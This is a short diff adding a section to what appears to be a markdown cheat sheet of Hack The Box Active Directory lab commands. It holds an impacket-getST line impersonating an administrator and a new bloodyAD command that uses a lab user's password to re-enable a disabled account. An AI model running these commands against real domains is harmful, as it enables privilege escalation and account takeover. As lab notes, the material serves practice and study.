@@ -860,3 +860,17 @@ impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate administrator -altser
 ```
 
 </details>
+
+---
+<details>
+  <summary><strong>STATUS_ACCOUNT_DISABLED</strong></summary>
+
+<img width="1203" height="122" alt="image" src="https://github.com/user-attachments/assets/42bdf65d-8ddd-467e-a4d3-5f413e2f4810" />
+<img width="495" height="625" alt="image" src="https://github.com/user-attachments/assets/e0df2f61-bc4e-43e7-a8cf-466608ec0c60" />
+
+
+```bash
+bloodyAD -u ant.edwards -p 'Antman2025!' --host 10.129.232.75 -d puppy.htb remove uac -f ACCOUNTDISABLE adam.silver
+```
+  
+</details>
